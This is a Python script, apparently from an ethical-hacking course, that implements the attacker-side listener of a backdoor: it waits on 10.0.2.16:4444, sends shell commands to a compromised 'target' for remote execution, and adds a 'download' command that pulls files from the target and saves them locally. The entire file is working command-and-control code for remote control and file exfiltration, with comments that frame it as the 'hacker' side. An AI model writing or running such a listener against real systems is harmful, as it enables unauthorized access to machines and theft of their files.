#!/usr/bin/env python
#download functionality added so file of target can be downloaded in hacker running command in hacker
#file is series of char so to transfer file we should read the file as seq of char,
# send this seq of char,create new empty file at destination,
# store the transferred seq of char in new file
import socket,json,base64
class Listener:
    def __init__(self,ip,port):
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 
        listener.bind((ip,port)) 
        listener.listen(0) 
        print("[+] waiting for incoming connection")
        self.connection, address=listener.accept() #to make connection acceptable to anywhere in code use self
        print("[+] got connection from " + str(address))
    def reliable_receive(self):#best implementation look serialisation once.value error is due to receiving and unpacking incomplete data
        #use instead of socket send method for everytime we need to send data 
        json_data=""
        while True:
            try:
                json_data=json_data + self.connection.recv(1024)
                return json.loads(json_data) 
            except ValueError:
                continue                
    def reliable_send(self,data):#use instead of socket send method for everytime we need to send data 
        json_data=json.dumps(data)#convert to json
        self.connection.send(json_data)    
    def execute_remotly(self,command):
        self.reliable_send(command) 
        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.reliable_receive() 
    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Successfully downloaded file"    

    def run(self):
        while True:
            command = input(">>")
            command=command.split(" ")#send command in list besause serialization helps to send in any form
            # print(command)
            result=self.execute_remotly(command)
            if command[0]=="download":
                result=self.write_file(command[1],result)
            print(result)
listener_obj=Listener("10.0.2.16",4444)
listener_obj.run()            

#the downloaded file should be shaved in location with same name rather than printed on screen so